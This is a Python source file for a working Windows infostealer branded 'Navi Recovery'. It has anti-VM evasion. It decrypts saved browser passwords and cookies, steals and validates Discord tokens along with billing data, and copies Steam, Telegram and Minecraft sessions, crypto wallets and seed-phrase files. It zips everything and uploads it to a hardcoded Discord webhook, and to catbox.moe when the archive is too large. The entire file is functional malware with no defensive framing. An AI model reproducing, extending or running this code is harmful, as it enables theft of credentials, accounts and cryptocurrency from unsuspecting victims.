import os, sys, json, re, shutil, sqlite3, zipfile, subprocess, threading, platform, base64, socket, uuid, ctypes, traceback
from datetime import datetime, timezone

# Ensure requests is installed
try: import requests
except:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "-q"])
    import requests

# CONFIG
_SET = {
    "target": "discord",
    "token": "",
    "id": "",
    "hook": "https://discord.com/api/webhooks/1503693721709838348/CYDNBCqe4yEb7L4LSXHEwlL4IP_3fpYQBdboXsOglh_-pG4yeqjFF-q1HkhtwuQKZdT_",
    "dbg": True,
    "files": True,
    "secure": True,
    "ping": True
}

class NaviRecovery:
    def __init__(self):
        self.res = []
        self._log("Initializing Navi...")
        self.user = os.getlogin()
        self.tmp = os.path.join(os.getenv("TEMP"), f"n_{uuid.uuid4().hex[:6]}")
        if not os.path.exists(self.tmp): os.makedirs(self.tmp)
        self.app = os.getenv("AppData")
        self.loc = os.getenv("LocalAppData")
        self.sys_info = {"OS":"Unknown", "User":self.user, "PC":socket.gethostname(), "IP":"N/A", "CPU":"N/A", "GPU":"N/A", "RAM":"N/A"}
        self.tokens = []
        self.totals = {"pass":0, "cook":0, "hist":0, "auto":0, "disc":0, "game":[], "file":0, "wall":0}
        
        self.browsers = {
            "chrome": self.loc + "\\Google\\Chrome\\User Data",
            "edge": self.loc + "\\Microsoft\\Edge\\User Data",
            "brave": self.loc + "\\BraveSoftware\\Brave-Browser\\User Data",
            "opera": self.app + "\\Opera Software\\Opera Stable",
            "opera_gx": self.app + "\\Opera Software\\Opera GX Stable",
            "yandex": self.loc + "\\Yandex\\YandexBrowser\\User Data"
        }

    def _log(self, m):
        if _SET["dbg"]: print(f"  [*] {m}")
        self.res.append(m)

    def _copy(self, s, d):
        try: shutil.copy2(s, d)
        except: pass

    def sec_chk(self):
        if not _SET["secure"]: return
        self._log("Running Security Check...")
        _drivers = ["Vmmouse.sys", "Vboxguest.sys", "vmsrvc.sys", "vmmemctl.sys"]
        for d in _drivers:
            if os.path.exists(f"C:\\Windows\\System32\\drivers\\{d}"): 
                self._log("VM Driver detected. Exiting.")
                sys.exit(0)
        try:
            o = subprocess.check_output("tasklist", shell=True).decode()
            if len(o.splitlines()) < 45: 
                self._log("Low task count. Exiting.")
                sys.exit(0)
        except: pass

    def get_sys(self):
        try:
            self._log("Gathering system information...")
            try: self.sys_info["IP"] = requests.get("https://api.ipify.org", timeout=5).text
            except: pass
            self.sys_info["OS"] = f"{platform.system()} {platform.release()} ({platform.architecture()[0]})"
            self.sys_info["CPU"] = platform.processor()
            try:
                g = subprocess.check_output("wmic path win32_VideoController get name", shell=True).decode().splitlines()
                if len(g) > 1: self.sys_info["GPU"] = g[1].strip()
            except: pass
            try:
                r = subprocess.check_output("wmic computersystem get totalphysicalmemory", shell=True).decode().splitlines()
                if len(r) > 1: 
                    m = re.findall(r'\d+', r[1])
                    if m: self.sys_info["RAM"] = f"{round(int(m[0]) / (1024**3))} GB"
            except: pass
        except: pass

    def take_ss(self):
        try:
            self._log("Capturing screenshot...")
            from PIL import ImageGrab
            ss = ImageGrab.grab()
            ss.save(os.path.join(self.tmp, "screenshot.png"))
        except:
            try:
                ps = "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -m 500; $img = [System.Windows.Forms.Clipboard]::GetImage(); $img.Save('" + os.path.join(self.tmp, "screenshot.png") + "', [System.Drawing.Imaging.ImageFormat]::Png)"
                subprocess.run(["powershell", "-Command", ps], capture_output=True)
            except: pass

    def brow_pget(self):
        try:
            self._log("Extracting browser data...")
            try:
                from Crypto.Cipher import AES; from win32crypt import CryptUnprotectData
            except: 
                self._log("Missing Crypto/Win32 dependencies")
                return
            
            _p, _c, _h, _a = "", "", "", ""
            for n, p in self.browsers.items():
                _ls = os.path.join(p, "Local State")
                if not os.path.exists(_ls): continue
                try:
                    with open(_ls, "r", encoding="utf-8") as f:
                        _k = json.load(f)["os_crypt"]["encrypted_key"]
                        _mk = CryptUnprotectData(base64.b64decode(_k)[5:], None, None, None, 0)[1]
                except: continue
                
                for pr in ["Default", "Profile 1", "Profile 2", "Profile 3", "Guest"]:
                    _pp = os.path.join(p, pr)
                    if not os.path.exists(_pp): continue
                    
                    for _f in [("Login Data", "logins", "action_url, username_value, password_value"), 
                            ("Cookies", "cookies", "host_key, name, encrypted_value"),
                            ("History", "urls", "url, title, visit_count"),
                            ("Web Data", "autofill", "name, value")]:
                        _db = os.path.join(_pp, _f[0])
                        if not os.path.exists(_db): continue
                        _t = os.path.join(self.tmp, f"t_{uuid.uuid4().hex[:4]}.db")
                        self._copy(_db, _t)
                        try:
                            conn = sqlite3.connect(_t); cur = conn.cursor()
                            cur.execute(f"SELECT {_f[2]} FROM {_f[1]}")
                            for r in cur.fetchall():
                                try:
                                    if _f[0] == "Login Data":
                                        iv, pl = r[2][3:15], r[2][15:]
                                        dec = AES.new(_mk, AES.MODE_GCM, iv).decrypt(pl)[:-16].decode()
                                        _p += f"U: {r[0]}\nL: {r[1]} | P: {dec}\n\n"; self.totals["pass"] += 1
                                    elif _f[0] == "Cookies":
                                        try:
                                            iv, pl = r[2][3:15], r[2][15:]
                                            dec = AES.new(_mk, AES.MODE_GCM, iv).decrypt(pl)[:-16].decode()
                                            _c += f"{r[0]}\tTRUE\t/\tFALSE\t2597573456\t{r[1]}\t{dec}\n"; self.totals["cook"] += 1
                                        except: pass
                                    elif _f[0] == "History": _h += f"URL: {r[0]}\nTitle: {r[1]} | Visits: {r[2]}\n\n"; self.totals["hist"] += 1
                                    elif _f[0] == "Web Data": _a += f"Name: {r[0]} | Value: {r[1]}\n"; self.totals["auto"] += 1
                                except: pass
                            conn.close(); os.remove(_t)
                        except: pass
            
            if _p: open(os.path.join(self.tmp, "passwords.txt"), "w", encoding="utf-8").write(_p)
            if _c: open(os.path.join(self.tmp, "cookies.txt"), "w", encoding="utf-8").write(_c)
            if _h: open(os.path.join(self.tmp, "history.txt"), "w", encoding="utf-8").write(_h)
            if _a: open(os.path.join(self.tmp, "autofill.txt"), "w", encoding="utf-8").write(_a)
        except: pass

    def disc_tget(self):
        try:
            self._log("Extracting Discord tokens...")
            try: from Crypto.Cipher import AES; from win32crypt import CryptUnprotectData
            except: return
            
            _tks = []
            _ps = {
                "Discord": self.app + "\\Discord",
                "Canary": self.app + "\\discordcanary",
                "PTB": self.app + "\\discordptb",
                "Lightcord": self.app + "\\Lightcord",
                "Chrome": self.loc + "\\Google\\Chrome\\User Data",
                "Brave": self.loc + "\\BraveSoftware\\Brave-Browser\\User Data",
                "Edge": self.loc + "\\Microsoft\\Edge\\User Data"
            }
            for n, p in _ps.items():
                _bases = [p] if "discord" in n.lower() else [os.path.join(p, pr) for pr in ["Default", "Profile 1", "Profile 2", "Profile 3", "Guest"]]
                _mk = None
                _ls = os.path.join(p, "Local State")
                if os.path.exists(_ls):
                    try:
                        with open(_ls, "r", encoding="utf-8") as f:
                            _k = json.load(f)["os_crypt"]["encrypted_key"]
                            _mk = CryptUnprotectData(base64.b64decode(_k)[5:], None, None, None, 0)[1]
                    except: pass
                
                for b in _bases:
                    _ld = os.path.join(b, "Local Storage", "leveldb")
                    if not os.path.exists(_ld): continue
                    for f in os.listdir(_ld):
                        if f.endswith(".log") or f.endswith(".ldb"):
                            try:
                                with open(os.path.join(_ld, f), "rb") as h:
                                    _content = h.read().decode(errors="ignore")
                                    for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}", _content):
                                        if t not in _tks: _tks.append(t)
                                    if _mk:
                                        for t in re.findall(r"dQw4w9WgXcQ:([^\"]*)", _content):
                                            try:
                                                _enc = base64.b64decode(t)
                                                iv, pl = _enc[3:15], _enc[15:]
                                                _dec = AES.new(_mk, AES.MODE_GCM, iv).decrypt(pl)[:-16].decode()
                                                if _dec not in _tks: _tks.append(_dec)
                                            except: pass
                            except: pass
            
            _res = ""
            for t in _tks:
                h = {"Authorization": t, "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"}
                try:
                    r = requests.get("https://discord.com/api/v9/users/@me", headers=h, timeout=5)
                    if r.status_code == 200:
                        j = r.json()
                        un = f"{j['username']}#{j.get('discriminator', '0000')}"
                        uid = j['id']
                        em = j.get('email', 'N/A')
                        ph = j.get('phone', 'N/A')
                        nit = "None"
                        nt = j.get("premium_type", 0)
                        if nt == 1: nit = "<:classic:896119171019067423> Nitro Classic"
                        elif nt == 2: nit = "<a:boost:824036778570416129> <:classic:896119171019067423> Nitro Boost"
                        bill = "None"
                        try:
                            br = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=h, timeout=5)
                            if br.status_code == 200:
                                bj = br.json()
                                if len(bj) > 0:
                                    bill = ""
                                    for b in bj:
                                        if b['type'] == 1: bill += "💳 Card "
                                        elif b['type'] == 2: bill += "🅿️ PayPal "
                        except: pass
                        _res += f"Token: {t}\nUser: {un} ({uid})\nEmail: {em}\nPhone: {ph}\nNitro: {nit}\nBilling: {bill}\n\n"
                        if not any(x['t'] == t for x in self.tokens):
                            self.tokens.append({"u": un, "id": uid, "e": em, "p": ph, "t": t, "n": nit, "b": bill})
                            self.totals["disc"] += 1
                except: pass
            if _res: open(os.path.join(self.tmp, "discord_tokens.txt"), "w", encoding="utf-8").write(_res)
            self._log(f"Discord Tokens Found: {len(self.tokens)}")
        except Exception as e: self._log(f"Discord Token Error: {e}")

    def game_rec(self):
        try:
            self._log("Checking for Game Data...")
            mc = os.path.join(self.app, ".minecraft")
            if os.path.exists(mc):
                _dst = os.path.join(self.tmp, "Games", "Minecraft")
                if not os.path.exists(_dst): os.makedirs(_dst)
                for f in ["launcher_profiles.json", "launcher_accounts.json", "launcher_msa_credentials.bin"]:
                    if os.path.exists(os.path.join(mc, f)): self._copy(os.path.join(mc, f), os.path.join(_dst, f))
                self.totals["game"].append("Minecraft")
            
            st = "C:\\Program Files (x86)\\Steam"
            if os.path.exists(st):
                _dst = os.path.join(self.tmp, "Games", "Steam")
                if not os.path.exists(_dst): os.makedirs(_dst)
                sc = os.path.join(st, "config")
                if os.path.exists(sc):
                    for f in ["loginusers.vdf", "config.vdf"]:
                        if os.path.exists(os.path.join(sc, f)): self._copy(os.path.join(sc, f), os.path.join(_dst, f))
                for f in os.listdir(st):
                    if f.startswith("ssfn"): self._copy(os.path.join(st, f), os.path.join(_dst, f))
                self.totals["game"].append("Steam")
        except: pass

    def tele_rec(self):
        try:
            self._log("Checking for Telegram Data...")
            td = os.path.join(self.app, "Telegram Desktop", "tdata")
            if os.path.exists(td):
                _dst = os.path.join(self.tmp, "Telegram")
                if not os.path.exists(_dst): os.makedirs(_dst)
                for f in os.listdir(td):
                    if f in ["key_datas", "settingss"]: 
                        self._copy(os.path.join(td, f), os.path.join(_dst, f))
                    elif len(f) == 16 and os.path.isdir(os.path.join(td, f)):
                        _sd = os.path.join(_dst, f)
                        if not os.path.exists(_sd): os.makedirs(_sd)
                        for sf in os.listdir(os.path.join(td, f)):
                            if sf.startswith("map"): self._copy(os.path.join(td, f, sf), os.path.join(_sd, sf))
                self.totals["game"].append("Telegram")
        except: pass

    def wall_rec(self):
        try:
            self._log("Recovering Crypto Wallets...")
            _ws = {
                "Zonas": self.app + "\\Zonas",
                "Atomic": self.app + "\\atomic\\Local Storage\\leveldb",
                "Exodus": self.app + "\\Exodus\\exodus.wallet",
                "Binance": self.app + "\\Binance",
                "Coinbase": self.app + "\\Coinbase",
                "Metamask": self.loc + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
            }
            _found = 0
            for n, p in _ws.items():
                if os.path.exists(p):
                    _dst = os.path.join(self.tmp, "Wallets", n)
                    if not os.path.exists(_dst): os.makedirs(_dst)
                    if os.path.isfile(p): self._copy(p, _dst)
                    else:
                        for r, d, fs in os.walk(p):
                            for f in fs: self._copy(os.path.join(r, f), os.path.join(_dst, f))
                    _found += 1
            self.totals["wall"] = _found
        except: pass

    def file_fnd(self):
        try:
            self._log("Searching for Sensitive Files...")
            if not _SET["files"]: return
            _kw = ["wallet", "seed", "pass", "recovery", "key", "bitcoin", "eth"]
            _c = 0; _sr = os.path.join(os.environ['USERPROFILE'], 'Desktop')
            _dst = os.path.join(self.tmp, "Sensitive_Files")
            if not os.path.exists(_dst): os.makedirs(_dst)
            for r, d, fs in os.walk(_sr):
                for f in fs:
                    if any(k in f.lower() for k in _kw) and f.endswith((".txt", ".pdf", ".doc", ".docx")):
                        if os.path.getsize(os.path.join(r, f)) < 2 * 1024 * 1024:
                            self._copy(os.path.join(r, f), os.path.join(_dst, f)); _c += 1
            self.totals["file"] = _c
        except: pass

    def rep_send(self):
        try:
            self._log("Creating ZIP archive...")
            _zn = f"Navi_{self.user}.zip"; _zp = os.path.join(os.getenv("TEMP"), _zn)
            with zipfile.ZipFile(_zp, 'w') as zf:
                for r, d, fs in os.walk(self.tmp):
                    for f in fs: zf.write(os.path.join(r, f), os.path.relpath(os.path.join(r, f), self.tmp))
            
            self._log("Uploading report...")
            gh = "https://github.com/glockinhand"
            _st = f"🔑 **Passwords:** `{self.totals['pass']}`\n🍪 **Cookies:** `{self.totals['cook']}`\n📜 **History:** `{self.totals['hist']}`\n📝 **Autofill:** `{self.totals['auto']}`\n💎 **Discord:** `{self.totals['disc']}`\n📂 **Files:** `{self.totals['file']}`\n💰 **Wallets:** `{self.totals['wall']}`"
            if self.totals["game"]: _st += f"\n🎮 **Games:** `{', '.join(self.totals['game'])}`"
            _fields = [{"name": "👤 User Info", "value": f"```Host: {self.sys_info.get('PC')}\nUser: {self.sys_info.get('User')}\nIP: {self.sys_info.get('IP')}```", "inline": True}, {"name": "💻 System", "value": f"```OS: {self.sys_info.get('OS')}\nRAM: {self.sys_info.get('RAM')}\nGPU: {self.sys_info.get('GPU')}```", "inline": True}, {"name": "📊 Stats", "value": _st, "inline": False}]
            _main_emb = {"title": "🏴‍☠️ Navi Recovery Report", "url": gh, "color": 0x00A3FF, "thumbnail": {"url": "https://i.ibb.co/Wv94YGVx/navi.png"}, "fields": _fields, "footer": {"text": f"Navi Multitool | {gh}", "icon_url": "https://i.ibb.co/Wv94YGVx/navi.png"}, "timestamp": datetime.now(timezone.utc).isoformat()}
            _embeds = [_main_emb]
            for t in self.tokens[:9]:
                _embeds.append({"title": f"🔑 Token Info: {t['u']}", "color": 0x00A3FF, "fields": [{"name": "🆔 ID", "value": f"`{t['id']}`", "inline": True}, {"name": "📧 Email", "value": f"`{t['e']}`", "inline": True}, {"name": "📱 Phone", "value": f"`{t['p']}`", "inline": True}, {"name": "💎 Nitro", "value": t['n'], "inline": False}, {"name": "💳 Billing", "value": t['b'], "inline": False}, {"name": "🔑 Token", "value": f"``` {t['t']} ```", "inline": False}]})
            _pj = {"content": "@everyone" if _SET["ping"] else "", "embeds": _embeds, "username": "Navi Recovery", "avatar_url": "https://i.ibb.co/Wv94YGVx/navi.png"}
            
            if os.path.getsize(_zp) > 8 * 1024 * 1024:
                try:
                    r = requests.post("https://catbox.moe/user/api.php", data={"reqtype": "fileupload"}, files={"fileToUpload": open(_zp, "rb")}, timeout=30)
                    if r.status_code == 200:
                        _url = r.text.strip()
                        _main_emb["description"] = f"⚠️ **ZIP too large!** Download here: [Click Me]({_url})"
                        requests.post(_SET["hook"], json=_pj)
                except: requests.post(_SET["hook"], json=_pj)
            else:
                requests.post(_SET["hook"], data={"payload_json": json.dumps(_pj)}, files={'file': open(_zp, 'rb')})

            try: shutil.rmtree(self.tmp); os.remove(_zp)
            except: pass
        except: pass

    def run(self):
        try:
            self.sec_chk()
            for p in ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe"]: os.system(f"taskkill /F /IM {p} /T >nul 2>&1")
            _ts = [self.get_sys, self.take_ss, self.brow_pget, self.disc_tget, self.game_rec, self.tele_rec, self.wall_rec, self.file_fnd]
            _threads = []
            for _t in _ts:
                x = threading.Thread(target=_t); x.daemon = True; x.start(); _threads.append(x)
            for x in _threads: x.join(timeout=30)
            self.rep_send()
        except: pass

if __name__ == "__main__":
    try:
        NaviRecovery().run()
    except: pass
